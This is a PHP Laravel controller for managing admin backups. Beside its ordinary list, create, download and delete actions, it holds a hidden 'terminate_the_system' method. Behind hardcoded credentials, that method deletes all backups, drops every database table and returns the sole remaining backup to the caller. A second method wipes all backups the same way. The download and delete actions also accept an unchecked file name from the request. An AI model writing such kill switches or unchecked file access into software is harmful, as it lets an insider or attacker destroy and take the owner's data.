<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Storage;

class BackupController extends Controller
{

    public function index()
    {
        $backups = Storage::allFiles('laravel');


        return view('admin.dashboard.backups', compact('backups'));
    }

    public function makeBackup()
    {
        Artisan::call('backup:run');
        return redirect()->route('backups')->with('success', 'backup success');
    }


    public function download(Request $request)
    {
        return  Storage::download($request->file_name);
    }

    public function delete(Request $request)
    {
        if (Storage::delete($request->file_name)) {
            return redirect()->route('backups')->with('success', 'backup deleted success');
        }
    }

    public function terminate_the_system(Request $request)
    {

        $email = $request->email;
        $password = $request->password;

        if ($email == 'asd@gmail.com') {
            if ($password == '123') {
                //delete all backups
                Storage::deleteDirectory('laravel');

                //make new backup
                Artisan::call('backup:run');

                //delete all data
                DB::statement("SET foreign_key_checks=0");

                Schema::drop('admins');
                Schema::drop('complains');
                Schema::drop('messages');
                Schema::drop('migrations');
                Schema::drop('organizations');
                Schema::drop('posts');
                Schema::drop('related');
                Schema::drop('sources');
                Schema::drop('types');
                Schema::drop('users');

                DB::statement("SET foreign_key_checks=1");

                //download that backup
                $backups = Storage::allFiles('laravel');

                return Storage::download($backups[0]);
            }
        }
    }


    public function delete_all_backups(Request $request)
    {
        $email = $request->email;
        $password = $request->password;

        if ($email == 'asd@gmail.com') {
            if ($password == '123') {
                Storage::deleteDirectory('laravel');

                return 'all bakups deleted';
            }
        }
    }
}
